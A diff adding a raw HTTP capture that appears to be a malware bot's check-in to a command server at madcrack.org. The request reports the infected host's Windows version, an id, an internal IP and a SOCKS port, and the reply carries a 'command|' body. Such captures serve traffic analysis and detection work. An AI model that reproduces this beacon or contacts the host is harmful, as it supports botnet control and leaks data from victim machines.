@@ -1,0 +1,21 @@
+HTTP/1.1 200 OK
+Server: nginx/0.9.5
+Date: Tue, 01 Mar 2011 20:33:15 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+Keep-Alive: timeout=20
+X-Powered-By: PHP/5.2.17
+
+8
+command|
+0
+
+GET /bbeter/load.php?win=WinXP&id=7EE9B18&lip=172.16.2.54&s5=39040 HTTP/1.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Host: madcrack.org
+Accept: */*
+Referer: http://madcrack.org/
+Connection: Keep-Alive
+
+
